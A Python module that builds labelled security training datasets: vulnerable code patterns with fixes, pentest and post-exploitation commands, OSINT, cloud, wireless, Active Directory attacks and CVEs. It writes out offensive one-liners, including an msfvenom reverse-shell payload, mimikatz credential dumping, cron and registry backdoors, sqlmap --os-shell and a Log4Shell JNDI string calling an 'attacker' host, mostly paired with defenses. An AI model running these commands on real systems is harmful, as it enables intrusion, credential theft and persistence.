"""
Th3 Thirty3 - Security Datasets
Training data for ethical hacking AI models
"""

import json
import os
from typing import List, Dict, Any

class SecurityDatasets:
    """Security-focused training datasets for ethical hacking AI."""
    
    def __init__(self, data_dir='/app/datasets'):
        self.data_dir = data_dir
        os.makedirs(data_dir, exist_ok=True)
    
    def get_vulnerability_patterns(self) -> List[Dict[str, Any]]:
        """Get vulnerability pattern training data."""
        return [
            # SQL Injection
            {
                'pattern': "SELECT * FROM users WHERE id = '{user_input}'",
                'label': 'sql_injection',
                'severity': 'critical',
                'description': 'Direct string concatenation in SQL query',
                'fix': 'Use parameterized queries or prepared statements'
            },
            {
                'pattern': "query = f\"SELECT * FROM {table} WHERE {column} = {value}\"",
                'label': 'sql_injection',
                'severity': 'critical',
                'description': 'F-string SQL query construction',
                'fix': 'Use SQLAlchemy ORM or parameterized queries'
            },
            
            # XSS
            {
                'pattern': "innerHTML = user_input",
                'label': 'xss',
                'severity': 'high',
                'description': 'Direct innerHTML assignment with user input',
                'fix': 'Use textContent or sanitize HTML'
            },
            {
                'pattern': "document.write(location.search)",
                'label': 'xss',
                'severity': 'high',
                'description': 'DOM-based XSS via URL parameters',
                'fix': 'Validate and encode URL parameters'
            },
            
            # Command Injection
            {
                'pattern': "os.system(f'ping {host}')",
                'label': 'command_injection',
                'severity': 'critical',
                'description': 'Shell command with user input',
                'fix': 'Use subprocess with list arguments, validate input'
            },
            {
                'pattern': "subprocess.call(cmd, shell=True)",
                'label': 'command_injection',
                'severity': 'high',
                'description': 'Shell execution enabled in subprocess',
                'fix': 'Use shell=False with argument list'
            },
            
            # Path Traversal
            {
                'pattern': "open(os.path.join(base_dir, user_path))",
                'label': 'path_traversal',
                'severity': 'high',
                'description': 'Potential path traversal via user input',
                'fix': 'Validate path is within base directory'
            },
            
            # Authentication Issues
            {
                'pattern': "if password == stored_password:",
                'label': 'weak_auth',
                'severity': 'critical',
                'description': 'Plain text password comparison',
                'fix': 'Use bcrypt or argon2 for password hashing'
            },
            
            # Insecure Deserialization
            {
                'pattern': "pickle.loads(user_data)",
                'label': 'insecure_deserialization',
                'severity': 'critical',
                'description': 'Pickle deserialization of untrusted data',
                'fix': 'Use JSON or validate pickle source'
            },
            
            # SSRF
            {
                'pattern': "requests.get(user_provided_url)",
                'label': 'ssrf',
                'severity': 'high',
                'description': 'Server-side request to user-provided URL',
                'fix': 'Whitelist allowed domains, block internal IPs'
            }
        ]
    
    def get_pentesting_techniques(self) -> List[Dict[str, Any]]:
        """Get pentesting technique training data."""
        return [
            # Reconnaissance
            {
                'category': 'reconnaissance',
                'technique': 'Port Scanning',
                'tools': ['nmap', 'masscan', 'rustscan'],
                'commands': [
                    'nmap -sS -sV -O -p- target',
                    'nmap --script vuln target',
                    'masscan -p1-65535 target --rate 1000'
                ],
                'defenses': ['Firewall rules', 'Port knocking', 'IDS/IPS']
            },
            {
                'category': 'reconnaissance',
                'technique': 'Service Enumeration',
                'tools': ['nmap', 'enum4linux', 'smbclient'],
                'commands': [
                    'nmap -sV --version-intensity 5 target',
                    'enum4linux -a target',
                    'smbclient -L //target'
                ],
                'defenses': ['Minimal service exposure', 'Version hiding']
            },
            
            # Exploitation
            {
                'category': 'exploitation',
                'technique': 'Metasploit Framework',
                'tools': ['msfconsole', 'msfvenom'],
                'commands': [
                    'use exploit/windows/smb/ms17_010_eternalblue',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe',
                    'sessions -i 1'
                ],
                'defenses': ['Patching', 'EDR', 'Network segmentation']
            },
            {
                'category': 'exploitation',
                'technique': 'SQL Injection',
                'tools': ['sqlmap', 'burpsuite'],
                'commands': [
                    'sqlmap -u "http://target/page?id=1" --dbs',
                    'sqlmap --os-shell',
                    'sqlmap --tamper=space2comment'
                ],
                'defenses': ['Parameterized queries', 'WAF', 'Input validation']
            },
            
            # Post-Exploitation
            {
                'category': 'post_exploitation',
                'technique': 'Privilege Escalation Linux',
                'tools': ['linpeas', 'linux-exploit-suggester'],
                'commands': [
                    'sudo -l',
                    'find / -perm -4000 2>/dev/null',
                    './linpeas.sh'
                ],
                'defenses': ['Least privilege', 'Sudo restrictions', 'Audit logs']
            },
            {
                'category': 'post_exploitation',
                'technique': 'Credential Dumping',
                'tools': ['mimikatz', 'secretsdump'],
                'commands': [
                    'sekurlsa::logonpasswords',
                    'lsadump::dcsync /user:Administrator',
                    'secretsdump.py domain/user:pass@dc'
                ],
                'defenses': ['Credential Guard', 'LSA Protection', 'LAPS']
            },
            
            # Persistence
            {
                'category': 'persistence',
                'technique': 'Backdoor Installation',
                'tools': ['netcat', 'cron', 'systemd'],
                'commands': [
                    'echo "* * * * * /path/to/backdoor" | crontab -',
                    'systemctl enable malicious.service',
                    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor'
                ],
                'defenses': ['File integrity monitoring', 'Autoruns analysis', 'EDR']
            }
        ]
    
    def get_osint_techniques(self) -> List[Dict[str, Any]]:
        """Get OSINT technique training data."""
        return [
            {
                'category': 'passive_recon',
                'technique': 'WHOIS Analysis',
                'description': 'Domain registration information gathering',
                'data_points': ['Registrant', 'Created date', 'Name servers', 'Contact info']
            },
            {
                'category': 'passive_recon', 
                'technique': 'DNS Enumeration',
                'description': 'Discover subdomains and DNS records',
                'tools': ['subfinder', 'amass', 'dnsrecon']
            },
            {
                'category': 'social_engineering',
                'technique': 'Social Media OSINT',
                'description': 'Gather info from social platforms',
                'platforms': ['LinkedIn', 'Twitter', 'GitHub', 'Facebook']
            },
            {
                'category': 'technical_recon',
                'technique': 'Shodan Search',
                'description': 'Find exposed devices and services',
                'queries': ['port:22', 'org:company', 'product:apache']
            },
            {
                'category': 'breach_data',
                'technique': 'Credential Leaks',
                'description': 'Search for exposed credentials',
                'sources': ['HaveIBeenPwned', 'DeHashed', 'BreachDirectory']
            }
        ]
    
    def get_cloud_security_scenarios(self) -> List[Dict[str, Any]]:
        """Get Cloud Security (AWS/Azure/GCP) training data."""
        return [
            {
                'category': 'cloud_misconfig',
                'platform': 'AWS',
                'issue': 'S3 Bucket Public Access',
                'detection': 'aws s3api get-bucket-acl --bucket target',
                'remediation': 'Enable "Block Public Access" at bucket or account level',
                'severity': 'critical'
            },
            {
                'category': 'cloud_iam',
                'platform': 'AWS',
                'issue': 'IAM Privilege Escalation',
                'technique': 'iam:CreatePolicyVersion',
                'description': 'User can set default policy version to a new permissive one',
                'tool': 'Pacu'
            },
            {
                'category': 'cloud_azure',
                'platform': 'Azure',
                'issue': 'Azure AD Guest User Enumeration',
                'technique': 'Guessing valid emails via login prompts',
                'remediation': 'Disable "Member can invite" and "Guest user access restrictions"'
            },
            {
                'category': 'cloud_container',
                'platform': 'Kubernetes',
                'issue': 'Privileged Pod Container',
                'detection': 'kubectl get pods -o jsonpath="{.items[*].spec.containers[*].securityContext.privileged}"',
                'risk': 'Container escape to host node'
            }
        ]

    def get_wireless_attacks(self) -> List[Dict[str, Any]]:
        """Get Wireless Network attack scenarios."""
        return [
            {
                'technique': 'WPA2 Handshake Capture',
                'tools': ['airodump-ng', 'aireplay-ng'],
                'command_sequence': [
                    'airmon-ng start wlan0',
                    'airodump-ng --bssid TARGET -c CHANNEL -w capture wlan0mon',
                    'aireplay-ng -0 10 -a TARGET wlan0mon'
                ],
                'goal': 'Capture EAPOL 4-way handshake for cracking'
            },
            {
                'technique': 'Evil Twin AP',
                'tools': ['hostapd', 'dnsmasq', 'wifi-pumpkin'],
                'description': 'Create rogue AP with same SSID to intercept credentials',
                'defense': 'Use WPA3-Enterprise, VPN, Certificate pinning'
            },
            {
                'technique': 'Bluetooth Low Energy (BLE) Spoofing',
                'tools': ['hcitool', 'gatttool', 'bleah'],
                'risk': 'IoT device hijacking'
            }
        ]

    def get_mobile_security(self) -> List[Dict[str, Any]]:
        """Get Mobile Application Security data."""
        return [
            {
                'platform': 'Android',
                'vulnerability': 'Insecure Intent',
                'tool': 'drozer',
                'command': 'run app.activity.start --component com.example .VulnerableActivity',
                'risk': 'Bypass authentication, access protected components'
            },
            {
                'platform': 'iOS',
                'vulnerability': 'Insecure Data Storage',
                'check': 'Analyze Plist files and NSUserDefaults for plain text secrets',
                'tool': 'objection'
            },
            {
                'technique': 'Frida Hooking',
                'description': 'Dynamic instrumentation to bypass SSL pinning',
                'code_snippet': 'Java.perform(function() { ... })'
            }
        ]

    def get_advanced_ad_attacks(self) -> List[Dict[str, Any]]:
        """Get Advanced Active Directory attack vectors."""
        return [
            {
                'attack': 'Kerberoasting',
                'description': 'Request TGS for services with SPN to crack offline',
                'tools': ['Rubeus', 'GetUserSPNs.py'],
                'detection': 'Monitor Event ID 4769 with RC4 encryption'
            },
            {
                'attack': 'AS-REP Roasting',
                'description': 'Target users with "Do not require Kerberos pre-authentication"',
                'remediation': 'Enforce pre-auth for all users'
            },
            {
                'attack': 'Golden Ticket',
                'description': 'Forge TGT using krbtgt hash for unlimited persistence',
                'impact': 'Complete domain compromise'
            },
            {
                'attack': 'DCSync',
                'description': 'Simulate Domain Controller to replicate password hashes',
                'privilege_needed': 'Replicating Directory Changes'
            }
        ]

    def get_defense_strategies(self) -> List[Dict[str, Any]]:
        """Get defense strategy training data."""
        return [
            {
                'category': 'network_security',
                'strategy': 'Network Segmentation',
                'implementation': 'VLANs, firewalls, zero-trust',
                'prevents': ['Lateral movement', 'Blast radius']
            },
            {
                'category': 'access_control',
                'strategy': 'Multi-Factor Authentication',
                'implementation': 'TOTP, FIDO2, SMS (fallback)',
                'prevents': ['Credential theft', 'Phishing']
            },
            {
                'category': 'monitoring',
                'strategy': 'SIEM Implementation',
                'implementation': 'Log aggregation, correlation, alerting',
                'detects': ['Anomalies', 'Attack patterns', 'Policy violations']
            },
            {
                'category': 'endpoint',
                'strategy': 'EDR Deployment',
                'implementation': 'Real-time monitoring, threat hunting',
                'detects': ['Malware', 'Fileless attacks', 'Lateral movement']
            },
            {
                'category': 'application',
                'strategy': 'WAF Configuration',
                'implementation': 'Rule-based filtering, anomaly detection',
                'prevents': ['SQLi', 'XSS', 'CSRF', 'Rate limiting']
            }
        ]
    
    def get_cve_training_data(self) -> List[Dict[str, Any]]:
        """Get CVE-based training data."""
        return [
            {
                'cve': 'CVE-2021-44228',
                'name': 'Log4Shell',
                'severity': 10.0,
                'type': 'Remote Code Execution',
                'affected': 'Apache Log4j 2.x',
                'exploit': '${jndi:ldap://attacker/exploit}',
                'remediation': 'Update to Log4j 2.17.0+'
            },
            {
                'cve': 'CVE-2017-0144',
                'name': 'EternalBlue',
                'severity': 9.8,
                'type': 'Remote Code Execution',
                'affected': 'Windows SMBv1',
                'exploit': 'Metasploit ms17_010_eternalblue',
                'remediation': 'Install MS17-010 patch, disable SMBv1'
            },
            {
                'cve': 'CVE-2021-34527',
                'name': 'PrintNightmare',
                'severity': 8.8,
                'type': 'Remote Code Execution',
                'affected': 'Windows Print Spooler',
                'exploit': 'CVE-2021-34527.py',
                'remediation': 'Disable Print Spooler or patch'
            },
            {
                'cve': 'CVE-2023-44487',
                'name': 'HTTP/2 Rapid Reset',
                'severity': 7.5,
                'type': 'Denial of Service',
                'affected': 'HTTP/2 implementations',
                'exploit': 'Rapid stream reset',
                'remediation': 'Apply vendor patches, rate limiting'
            }
        ]
    
    def save_dataset(self, name: str, data: List[Dict]) -> str:
        """Save dataset to file."""
        filepath = os.path.join(self.data_dir, f'{name}.json')
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        return filepath
    
    def load_dataset(self, name: str) -> List[Dict]:
        """Load dataset from file."""
        filepath = os.path.join(self.data_dir, f'{name}.json')
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
        return []
    
    def get_all_training_data(self) -> Dict[str, List]:
        """Get all training data combined."""
        return {
            'vulnerabilities': self.get_vulnerability_patterns(),
            'pentesting': self.get_pentesting_techniques(),
            'osint': self.get_osint_techniques(),
            'defense': self.get_defense_strategies(),
            'cves': self.get_cve_training_data(),
            'cloud': self.get_cloud_security_scenarios(),
            'wireless': self.get_wireless_attacks(),
            'mobile': self.get_mobile_security(),
            'active_directory': self.get_advanced_ad_attacks()
        }


if __name__ == '__main__':
    # Test datasets
    datasets = SecurityDatasets()
    all_data = datasets.get_all_training_data()
    
    print(f"Vulnerability patterns: {len(all_data['vulnerabilities'])}")
    print(f"Pentesting techniques: {len(all_data['pentesting'])}")
    print(f"OSINT techniques: {len(all_data['osint'])}")
    print(f"Defense strategies: {len(all_data['defense'])}")
    print(f"CVE data: {len(all_data['cves'])}")
    print(f"Cloud scenarios: {len(all_data['cloud'])}")
    print(f"Wireless attacks: {len(all_data['wireless'])}")
    print(f"Mobile security: {len(all_data['mobile'])}")
    print(f"Active Directory: {len(all_data['active_directory'])}")
